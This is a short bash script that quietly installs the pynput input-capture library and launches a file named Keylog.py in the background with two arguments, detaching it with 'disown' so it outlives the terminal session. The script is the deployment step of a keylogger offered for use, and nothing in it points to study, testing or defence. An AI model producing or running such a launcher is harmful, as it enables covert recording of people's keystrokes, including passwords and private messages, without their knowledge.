#!/usr/bin/env bash

yes | pip install -q --upgrade pip --user
yes | pip install -q pynput --user 
python Keylog.py $1 $2 & disown